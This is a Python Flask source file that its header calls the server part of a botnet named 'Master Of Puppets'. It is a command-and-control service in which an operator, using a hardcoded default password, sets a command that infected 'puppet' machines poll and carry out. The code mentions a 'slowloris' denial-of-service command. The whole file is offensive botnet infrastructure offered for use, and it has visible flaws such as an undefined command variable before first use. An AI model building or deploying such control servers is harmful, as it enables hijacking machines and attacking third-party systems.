#---------------------------------------------#     Filename: server.py
#             Master Of Puppets               #
#                                             #     This is botnet-server part of Master of Puppets.
#               by Commod0re                  #
#                                             #
#                 v. 0.0.1                    #
#                                             #
#---------------------------------------------#

from flask import Flask, request as r
import logging

#----------------CONFIG ZONE------------------#

logging.basicConfig(
    filename=
    "server.log",  # filename of logfile, below args are makes format of log-message
    format='%(asctime)s - %(message)s',
    level=logging.INFO)

app = Flask(__name__)  # just flask const

PASSWORD = "password"  # password to give command, you better to set strong password!

#---------------------------------------------#


def check_password(passw):  # check password in func given
    if passw == PASSWORD:
        return True
    if passw != PASSWORD:
        logging.info(
            f"[!] Authentification failed! Password was: {passw}")  # log
        return False


def command_resolver():  # adminapi func to set command
    global CURENTCOMMAND  # command variable

    password = r.args["password"]  # args from adminrequest, password
    command = r.args["command"]  # args from adminrequest, command

    if check_password(password) == True:
        if r.args["command"] != "slowloris":
            CURENTCOMMAND = r.args["command"] 
            return f"Success! Command set: {CURENTCOMMAND}"
        else:
            logging.info(
                f"[!] Failed to execute command! Command was {command}")  # log
            return "Fail"


@app.route("/adminapi")  # adminapi link
def recieve_command():
    return command_resolver()


@app.route("/puppetsapi")  # puppetapi link
def give_command():
    return CURENTCOMMAND


if __name__ == "__main__":  # start point
    app.run(debug=True)
